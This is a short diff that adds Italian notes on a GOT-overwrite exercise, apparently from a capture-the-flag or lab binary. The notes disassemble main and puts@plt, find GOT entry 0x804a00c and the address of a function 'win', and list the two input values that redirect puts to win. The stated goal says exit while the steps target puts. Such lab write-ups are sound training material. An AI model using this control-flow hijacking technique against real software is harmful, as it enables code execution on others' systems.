@@ -1,0 +1,15 @@
+Obbiettivo: sovrascrivere chiamata ad exit con chiamata a win
+1. disas main:
+	0x0804865c <+248>:	call   0x80483d0 <puts@plt>
+   per trovare la voce della GOT per puts facciamo disas di puts
+
+2. disas 0x080483d0
+	0x080483d0 <+0>:	jmp    DWORD PTR ds:0x804a00c
+   la funzione puts utilizza un salto alla GOT tramite l'indirizzo 0x804a00c
+
+3. trovo win
+	0x0804854b  win
+
+4. faccio run e inserisco in input:
+	0x804a00c
+	0x0804854b
